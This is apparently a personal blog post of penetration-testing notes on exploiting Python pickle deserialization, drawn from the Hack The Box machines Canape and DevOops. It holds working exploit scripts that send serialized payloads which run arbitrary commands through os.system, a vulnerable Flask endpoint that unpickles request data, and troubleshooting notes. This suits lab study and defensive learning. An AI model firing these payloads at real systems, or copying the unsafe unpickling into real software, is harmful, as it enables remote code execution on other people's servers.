---
layout: post
title: Python Pickle Deserialization
description: Python Pickle Deserialization
summary: Python Pickle Deserialization
tags: [python,deserialization,foothold]
minute: 1
---
## Payload Format
Here is an example script I used in HTB Canape.

```python
#!/usr/bin/env python2

import requests
import pickle
import os
from hashlib import md5

class exploit(object):
  def __reduce__(self):
    return (os.system, ('echo homer && ping -c 1 10.10.14.34',))
    # THIS DOESNT WORK
    # return (os.popen, ('echo homer && ping -c 1 10.10.14.34',)) 

def dump_exploit():
  return pickle.dumps(exploit())

payload = dump_exploit()
c = payload[:-1]
q = payload[-1:]
url = 'http://10.10.10.70'

def submit():
  r = requests.post(url + '/submit', data = {'character': c, 'quote': q})

def check():
  r = requests.post(url + '/check', data = {'id': md5(c+q).hexdigest()})

submit()
check()
```

## Troubleshooting
When I did HTB Canape, my exploit didn't work when I tried to use the HTML form in firefox.

![](/spindel/assets/Python%20Pickle%20Deserialization/FF16D104-763D-42D2-BF3D-C8181797ADAA.png)

But when I tried 0xdf python [script](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#code), it worked without any issues. I looked deeply by inspecting the packet capture for both python script and browser and here is what I found out.

Left side (python script), right (firefox).

![](/spindel/assets/Python%20Pickle%20Deserialization/7A8A1D33-2216-448E-865C-B2D8D716722D.png)

Based from the capture, the python script is sending `0A` which corresponds to newline `\n` while the firefox capture is sending `5c` which corresponds to file separator `\`.

If I tried again the HTML form in Firefox this time doing actual newline instead of `\n`, the packet capture looks better but it added `0D` for carriage return. Right now, I don't have clue yet on how to remove it.

![](/spindel/assets/Python%20Pickle%20Deserialization/FFB1CBD7-E58C-4BFE-B7B7-25C0016D1223.png)

![](/spindel/assets/Python%20Pickle%20Deserialization/F3B4C80C-4063-4C05-8C08-FAD46B34E93A.png)

* In HTB DevOops, my expoit was not working because I'm trying to incude `Subject` on the actual payload. Once I removed it, exploit worked.

```python
# This fails
payload = dump_exploit()
data_str = str({'Subject': payload})
data = base64.urlsafe_b64encode(data_str)

# This worked
payload = dump_exploit()
data = base64.urlsafe_b64encode(payload)
```

## Other Examples
* HTB DevOops

```python
# Vulnerable code
@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']
```

```python
#!/usr/bin/env python2

# Usage: python2 pickle_exploit.py 'ping -c 1 10.10.14.34'

import requests
import pickle
import os
import sys
from hashlib import md5
import base64

cmd = sys.argv[1]

class exploit(object):
  def __reduce__(self):
    return (os.system, (cmd,)) 

def dump_exploit():
  return pickle.dumps(exploit())

proxies = {'http': 'http://127.0.0.1:8080'}

payload = dump_exploit()
data = base64.urlsafe_b64encode(payload)
url = 'http://10.10.10.91:5000'

def submit():
  print(payload)
  r = requests.post(url + '/newpost', data = data, proxies = proxies)
  if r.status_code == 500:
    print('Exploit failed')
  else:
    print('Exploit successful!')

submit()
```

## References
* HTB Canape
* [Python Pickle Injection](http://xhyumiracle.com/python-pickle-injection/)
* [Exploiting Insecure Deserialization bugs found in the Wild (Python Pickles)](https://macrosec.tech/index.php/2021/06/29/exploiting-insecuredeserialization-bugs-found-in-the-wild-python-pickles/)
* [Pickle Arbitrary Code Execution](https://root4loot.com/post/exploiting_cpickle/)
